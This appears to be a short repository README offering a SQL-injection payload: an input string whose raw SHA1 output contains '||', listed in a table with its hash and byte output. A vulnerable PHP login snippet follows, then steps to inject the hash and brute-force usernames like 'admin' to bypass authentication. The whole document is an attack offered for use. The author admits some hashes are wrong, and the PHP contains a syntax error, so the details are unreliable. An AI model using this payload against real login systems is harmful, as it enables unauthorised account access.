# SHA1_RAW_SQL

# EDIT SOME OF THOSE HASHES CONTAIN ERRORS.... FIXING CONTINUES.
| Hash string                | SHA1 Hash                                     | Raw output            |Query |Author    |
| -------------------------- |:---------------------------------------------:|:---------------------:|:----:|:--------:|
| 5651578060603509           |96009c0bafe7be05e23b0079226f7222d82fee88       |E&�ɶ��'||'8�vjc\�     |'||'1 |0xJohannes|


#  EXAMPLE USAGE

```php
<?php

...SOME CODE...

function escape_sql()
  {
    ...sql escape...
  }
  
$pass = sha1($_POST['pass'], true);

$log = escape_sql($_POST'log']);

$sql = "select * from tablename where password=$pass AND username=$log";

...SOME CODE...
?>
```
* The first step is to inject one of suitable hashes.
* The second move is bruteforcing the login value i.e, (admin, 4dm1n and so on)
* THe third step is to buy me a coffee.
